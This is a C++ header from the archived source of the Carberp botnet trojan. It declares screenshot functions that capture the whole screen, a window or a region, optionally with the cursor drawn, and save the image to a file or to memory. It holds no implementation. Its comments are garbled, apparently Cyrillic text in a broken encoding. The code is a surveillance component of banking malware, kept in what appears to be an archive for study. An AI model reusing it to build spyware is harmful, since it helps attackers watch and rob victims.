/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#ifndef ScreenShotsH
#define ScreenShotsH
//---------------------------------------------------------------------------

#include <windows.h>

//****************************************************************************
// ScreenShot - ������ �������� ����������
//****************************************************************************

#define COLOR_RED  RGB(255,0,0)
#define COLOR_BLUE RGB(0,0,255)

typedef struct TDrawCursorInfo
{
	DWORD Mode;        // ���������������
	int X;             // ������� ������� X
	int Y;             // ������� ������� Y
	DWORD PointWidth;  // ������ �����
	DWORD Color;       // ���� �����
} *PDrawCursorInfo;

namespace ScreenShot
{
	//------------------------------------------------------
	//  Make - ������� �������� � �������� ��� � ����.
	//         ������ ����������� � ������� PNG
	//
	//    Wnd - ���� � �������� ���������� �������
	//			��������. NULL ���� ��������� ����� ������
	//
	//    X, Y, Width, Height - ���������� � ������ ������
	//          ���� ������� ������������� ����������, ��
	//          ����� ��������� ������� �� ��������� ����
	//
	//    DrawCursor - ���������� ��� ��������� ������� ����
	//
	//    FileName - ��� ����� ���� ����� ������� ������
	//------------------------------------------------------
	bool Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
			  PDrawCursorInfo DrawCursor, PWCHAR FileName);

	bool Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
			  PDrawCursorInfo DrawCursor, PCHAR FileName);

	//------------------------------------------------------
	//  CaptureScreen - ������� ������ �������� ������
	//------------------------------------------------------
	bool CaptureScreenA(PCHAR  FileName);
	bool CaptureScreenW(PWCHAR FileName);

	//------------------------------------------------------
	//  MakeToMem - ������� ������ ������ ������ � ��������
	//				��� � ������
	//
	//  ��������� ���������� ������� Make
	//
	//  OutData - ������� ������� ������ ��� ������ � ������
	//			  ��������� �� �� � ��� ����������
	//
	//  OutDataSize - ������ ���������� ������
    //
    //------------------------------------------------------

	bool MakeToMem(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
		PDrawCursorInfo DrawCursor, LPBYTE &OutData, DWORD &OutDataSize);

	//�������� �������� ����
	bool DrawWindow( HWND Wnd, PWCHAR FileName );
	bool DrawWindow( HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize );

	bool DrawWindow2( HWND Wnd, PWCHAR FileName );
	bool DrawWindow2( HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize );
};



//---------------------------------------------------------------------------
#endif
